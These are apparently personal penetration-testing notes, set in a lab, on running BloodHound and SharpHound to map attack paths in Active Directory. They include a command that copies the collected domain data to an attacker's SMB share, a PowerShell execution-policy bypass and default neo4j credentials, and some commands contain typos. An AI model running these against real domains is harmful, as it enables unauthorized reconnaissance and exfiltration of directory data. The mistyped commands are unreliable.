# Installation 

```bash
sudo apt install bloodhound

neo4j console
# open link
http://localhost:7474
#default creds
neoj4:neoj4
# set new password
# run bloodhound

```

# Prebuilt queries
Mark owned users as owned inside bloodhound 
![[Pasted image 20221226133410.png]]

```
shortest paths to domain admins from owned principals 
```

# Injestor 


## remote bloodhound
```
bloodhound --dns-tcp -ns 10.10.10.10 -d support.htb -u 'ldap' -p 'password' -c all

-ns # ip
-d # domain
-u # user
-p # password
```

## SharpHound 

[SharpCollection_repo](https://github.com/Flangvik/SharpCollection)

**Use latest NetFramework_ANY**

```powershell
# Upload sharphound to the target

.\SharpHound.exe -c all 
# start smbserver and send the file 
copy FILE.zip \\10.10.10.10\share\ # send .zip file to attackers ip 
```

### Invoke-bloodhound
```bash
# dfault path
/usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1
```
```powershell
powersehll -eq bypass
. .\SharpHoundps1
Invoke-bloodhound -Collectionmethod All -Domain marvel.local -ZipFileName file.zip

```

---
Tags: #AD #bloodhound #sharphound